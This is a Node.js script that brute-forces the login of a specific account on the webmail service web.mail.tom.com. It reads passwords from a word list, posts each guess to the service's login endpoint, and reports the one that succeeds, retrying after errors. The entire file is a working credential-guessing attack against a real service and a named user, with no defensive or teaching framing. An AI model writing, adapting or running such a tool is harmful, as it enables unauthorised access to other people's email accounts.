var http = require('http');
var fs = require("fs");
var querystring = require('querystring');
var conn;
var passArray;
var curPass;

var nameField = 'username';
var pswField = 'password';
var pswList = 'psw.lst';

var options = {
	method: 'POST',
	hostname: 'web.mail.tom.com',
	path: '/webmail/login/loginService.action'
};

function connect(){
	var mysql = require('mysql');
	conn = mysql.createConnection({
	    host: 'localhost',
	    user: 'root',
	    password: '',
	    database:'test',
	    port: 3306
	});
	conn.connect();
}

function readFile(){
	var data=fs.readFileSync("pass.lst","utf-8");
	passArray = data.split('\r\n');
	passArray = passArray.reverse();
}

function runCrack(){
	var pass = passArray.pop();
	curPass = pass;
	if(pass){
// var das =ds;
		var postData = {};
		// postData[nameField] = 'chzhbob@tom.com';
		postData[nameField] = 'brave99@tom.com';
		postData[pswField] = pass;
		postData = querystring.stringify(postData);
		
		options['headers'] = {
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': postData.length
		}

		var req = http.request(options, function(res){
			res.setEncoding('utf8');
			res.on('data', function(chunk){
				var now = new Date();
				var result = "";
				try{
					result = JSON.parse(chunk);
				}catch(err){
					console.log('error parse json');
					console.log(chunk);
					passArray.push(curPass);
					setTimeout(runCrack,1000);
					return;
				}

				if(result['status'] == '000'){
					console.log(result['status'] + '-' + curPass);
					return;
				}
				console.log(result['status'] + '-' + curPass);
				runCrack();
			});

			req.on('error', function(e) {
			  console.log('problem with request: ' + e.message);
			});
		});
		req.write(postData);
		req.end();
	}else{
		console.log('finish!');
	}

	
	
	
}

// connect();

readFile();
runCrack();

return;